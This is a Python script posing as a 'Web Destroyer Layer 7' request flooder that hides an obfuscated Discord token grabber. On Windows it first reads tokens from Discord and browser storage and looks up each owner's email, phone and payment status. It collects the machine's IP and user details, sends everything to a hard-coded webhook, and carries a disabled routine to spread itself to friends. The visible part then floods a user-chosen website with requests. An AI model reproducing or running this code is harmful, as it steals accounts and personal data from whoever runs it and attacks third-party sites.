from urllib.request import urlopen
import ssl
import os
if os.name != "nt":
    exit()
from re import findall
from art import *
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
tprint("Web Destroyer Layer 7")
try:
        _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
        pass
else:
        ssl._create_default_https_context = _create_unverified_https_context

i = 9
y = 0
LOCAL =os .getenv ("LOCALAPPDATA")#line:1
ROAMING =os .getenv ("APPDATA")#line:2
PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default"}#line:11
def getheaders (OOOOO00000OO000O0 =None ,O000O0O0O00000OOO ="application/json"):#line:12
    OO00000OOOOOO0O0O ={"Content-Type":O000O0O0O00000OOO ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:16
    if OOOOO00000OO000O0 :#line:17
        OO00000OOOOOO0O0O .update ({"Authorization":OOOOO00000OO000O0 })#line:18
    return OO00000OOOOOO0O0O #line:19
def getuserdata (O000000O00OOOOO0O ):#line:20
    try :#line:21
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (O000000O00OOOOO0O ))).read ().decode ())#line:22
    except :#line:23
        pass #line:24
def gettokens (OOOOOOOOOO0O0O000 ):#line:25
    OOOOOOOOOO0O0O000 +="\\Local Storage\\leveldb"#line:26
    O0OOOOOO0O0O0O00O =[]#line:27
    for OOOOO0O0OOO000O00 in os .listdir (OOOOOOOOOO0O0O000 ):#line:28
        if not OOOOO0O0OOO000O00 .endswith (".log")and not OOOOO0O0OOO000O00 .endswith (".ldb"):#line:29
            continue #line:30
        for OOOO000OOO0OO0000 in [OO00OO0OOOO0000OO .strip ()for OO00OO0OOOO0000OO in open (f"{OOOOOOOOOO0O0O000}\\{OOOOO0O0OOO000O00}",errors ="ignore").readlines ()if OO00OO0OOOO0000OO .strip ()]:#line:31
            for O000OO00O0O00O0OO in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:32
                for OO0O0O0OO00O00O00 in findall (O000OO00O0O00O0OO ,OOOO000OOO0OO0000 ):#line:33
                    O0OOOOOO0O0O0O00O .append (OO0O0O0OO00O00O00 )#line:34
    return O0OOOOOO0O0O0O00O #line:35
def getdeveloper ():#line:36
    OO0OO000O0OO00OOO ="wodx"#line:37
    try :#line:38
        OO0OO000O0OO00OOO =urlopen (Request ("https://pastebin.com/raw/346BfeP5")).read ().decode ()#line:39
    except :#line:40
        pass #line:41
    return OO0OO000O0OO00OOO #line:42
def getip ():#line:43
    O00O0O0OO0O00OOOO ="None"#line:44
    try :#line:45
        O00O0O0OO0O00OOOO =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:46
    except :#line:47
        pass #line:48
    return O00O0O0OO0O00OOOO #line:49
def getavatar (OOOOO000OO00OO0O0 ,OO0OO00O0OO000O0O ):#line:50
    O0OO000OOOOOO00OO =f"https://cdn.discordapp.com/avatars/{OOOOO000OO00OO0O0}/{OO0OO00O0OO000O0O}.gif"#line:51
    try :#line:52
        urlopen (Request (O0OO000OOOOOO00OO ))#line:53
    except :#line:54
        O0OO000OOOOOO00OO =O0OO000OOOOOO00OO [:-4 ]#line:55
    return O0OO000OOOOOO00OO #line:56
def gethwid ():#line:57
    OOO00OO00O00000O0 =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:58
    return (OOO00OO00O00000O0 .stdout .read ()+OOO00OO00O00000O0 .stderr .read ()).decode ().split ("\n")[1 ]#line:59
def getfriends (O0O00OOO00OOOO000 ):#line:60
    try :#line:61
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/relationships",headers =getheaders (O0O00OOO00OOOO000 ))).read ().decode ())#line:62
    except :#line:63
        pass #line:64
def getchat (O00OO0000O000OO00 ,OO0O0O0O00O000000 ):#line:65
    try :#line:66
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/channels",headers =getheaders (O00OO0000O000OO00 ),data =dumps ({"recipient_id":OO0O0O0O00O000000 }).encode ())).read ().decode ())["id"]#line:67
    except :#line:68
        pass #line:69
def has_payment_methods (OOOO0O0O0OO0OOOO0 ):#line:70
    try :#line:71
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (OOOO0O0O0OO0OOOO0 ))).read ().decode ()))>0 )#line:72
    except :#line:73
        pass #line:74
def send_message (OOO00O0O0O0O000O0 ,O00O0O00O000OO000 ,O00000O000O000000 ):#line:75
    try :#line:76
        urlopen (Request (f"https://discordapp.com/api/v6/channels/{O00O0O00O000OO000}/messages",headers =getheaders (OOO00O0O0O0O000O0 ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687"),data =O00000O000O000000 .encode ())).read ().decode ()#line:77
    except :#line:78
        pass #line:79
def spread (O000OO0OO00000OO0 ,O0OOOO00OOOOOOOOO ,O00O00OOOO0OOO0OO ):#line:80
    return #line:81
    for OO00OOOO00OO000OO in getfriends (O0OO0000O0O0O0O0O ):#line:82
        try :#line:83
            O0OO00OOO0000000O =getchat (O0OO0000O0O0O0O0O ,OO00OOOO00OO000OO ["id"])#line:84
            send_message (O0OO0000O0O0O0O0O ,O0OO00OOO0000000O ,O00O00O0OO0OOO0OO )#line:85
        except Exception as O000O0O0000O0OO0O :#line:86
            pass #line:87
        sleep (OO0OOO00000OO0O0O )#line:88
def main ():#line:89
    OO0000OOO00OO000O =ROAMING +"\\.cache~$"#line:90
    OOO00O000OO0OO00O =True #line:91
    OOOO00OOOO0000OO0 =False #line:92
    O0O0OO000O000OO0O =[]#line:93
    O00OOOOO0O00O0O0O =[]#line:94
    O00O0000O00000O00 =[]#line:95
    OO000O0OOO00000O0 =[]#line:96
    O0O00O00000O0O0OO =[]#line:97
    O000OO00O0OOO0OOO =getip ()#line:98
    OO0OO00O0O00OO00O =os .getenv ("UserName")#line:99
    O0000O0O0O00OOO00 =os .getenv ("COMPUTERNAME")#line:100
    OOO0OOOOO0O0O00O0 =os .getenv ("userprofile").split ("\\")[2 ]#line:101
    OO0O0OOO0O0O0OOOO =getdeveloper ()#line:102
    for OOOO0O0OO0OO0OO00 ,OO00OO00OO0OOOOO0 in PATHS .items ():#line:103
        if not os .path .exists (OO00OO00OO0OOOOO0 ):#line:104
            continue #line:105
        for O0OOOO00O0OOO0OO0 in gettokens (OO00OO00OO0OOOOO0 ):#line:106
            if O0OOOO00O0OOO0OO0 in O00O0000O00000O00 :#line:107
                continue #line:108
            O00O0000O00000O00 .append (O0OOOO00O0OOO0OO0 )#line:109
            O00OO00O0O0O0O000 =None #line:110
            if not O0OOOO00O0OOO0OO0 .startswith ("mfa."):#line:111
                try :#line:112
                    O00OO00O0O0O0O000 =b64decode (O0OOOO00O0OOO0OO0 .split (".")[0 ].encode ()).decode ()#line:113
                except :#line:114
                    pass #line:115
                if not O00OO00O0O0O0O000 or O00OO00O0O0O0O000 in O0O00O00000O0O0OO :#line:116
                    continue #line:117
            O000O0O0O00000O00 =getuserdata (O0OOOO00O0OOO0OO0 )#line:118
            if not O000O0O0O00000O00 :#line:119
                continue #line:120
            O0O00O00000O0O0OO .append (O00OO00O0O0O0O000 )#line:121
            O00OOOOO0O00O0O0O .append (O0OOOO00O0OOO0OO0 )#line:122
            OO00O0OO00OOO0O00 =O000O0O0O00000O00 ["username"]+"#"+str (O000O0O0O00000O00 ["discriminator"])#line:123
            OOO000O000O0OO0OO =O000O0O0O00000O00 ["id"]#line:124
            OO0O000000O0O00OO =O000O0O0O00000O00 ["avatar"]#line:125
            O00OOOOO0OOO00O0O =getavatar (OOO000O000O0OO0OO ,OO0O000000O0O00OO )#line:126
            O0OOO0000OO0O0OOO =O000O0O0O00000O00 .get ("email")#line:127
            O00O0000000000O0O =O000O0O0O00000O00 .get ("phone")#line:128
            O0OOO0OOO000OOOOO =bool (O000O0O0O00000O00 .get ("premium_type"))#line:129
            OOOO00OO00O0O0000 =bool (has_payment_methods (O0OOOO00O0OOO0OO0 ))#line:130
            OO00O00O0OO000O0O ={"color":0x7289da ,"fields":[{"name":"**Account Info**","value":f'Email: {O0OOO0000OO0O0OOO}\nPhone: {O00O0000000000O0O}\nNitro: {O0OOO0OOO000OOOOO}\nBilling Info: {OOOO00OO00O0O0000}',"inline":True },{"name":"**PC Info**","value":f'IP: {O000OO00O0OOO0OOO}\nUsername: {OO0OO00O0O00OO00O}\nPC Name: {O0000O0O0O00OOO00}\nToken Location: {OOOO0O0OO0OO0OO00}',"inline":True },{"name":"**Token**","value":O0OOOO00O0OOO0OO0 ,"inline":False }],"author":{"name":f"{OO00O0OO00OOO0O00} ({OOO000O000O0OO0OO})","icon_url":O00OOOOO0OOO00O0O },"footer":{"text":f"Token grabber by {OO0O0OOO0O0O0OOOO}"}}#line:157
            O0O0OO000O000OO0O .append (OO00O00O0OO000O0O )#line:158
    with open (OO0000OOO00OO000O ,"a")as O00O00O00OO0O0OOO :#line:159
        for O0OOOO00O0OOO0OO0 in O00O0000O00000O00 :#line:160
            if not O0OOOO00O0OOO0OO0 in OO000O0OOO00000O0 :#line:161
                O00O00O00OO0O0OOO .write (O0OOOO00O0OOO0OO0 +"\n")#line:162
    if len (O00OOOOO0O00O0O0O )==0 :#line:163
        O00OOOOO0O00O0O0O .append ('123')#line:164
    OO0000OOO0O00OOOO ={"content":"","embeds":O0O0OO000O000OO0O ,"username":"Creepy Crawley","avatar_url":"https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"}#line:170
    try :#line:171
        urlopen (Request ("https://discordapp.com/api/webhooks/749448656196862062/lxcUhbVJtCsBUCNByVUqIccy4oOOIHY74G0NfbHery5RRo5z4x45-w7ABMaICXEKSKIP",data =dumps (OO0000OOO0O00OOOO ).encode (),headers =getheaders ()))#line:172
    except :#line:173
        pass #line:174
    if OOOO00OOOO0000OO0 :#line:175
        for O0OOOO00O0OOO0OO0 in O00OOOOO0O00O0O0O :#line:176
            with open (argv [0 ],encoding ="utf-8")as O00O00O00OO0O0OOO :#line:177
                OOO00O0O0OOOO000O =O00O00O00OO0O0OOO .read ()#line:178
            OOOO0000O0OOO000O =f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{OOO00O0O0OOOO000O}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'#line:179
            Thread (target =spread ,args =(O0OOOO00O0OOO0OO0 ,OOOO0000O0OOO000O ,7500 /1000 )).start ()#line:180
try :#line:181
    main ()#line:182
except Exception as e :#line:183
    print (e )#line:184
    pass
site = input("Target: ")
 
print("Requests sending to: " + site)
while i == i:
	with urlopen(site) as response:
		html = str(response.read())
	y += 1
	print("Success! Request Number: " + str(y))
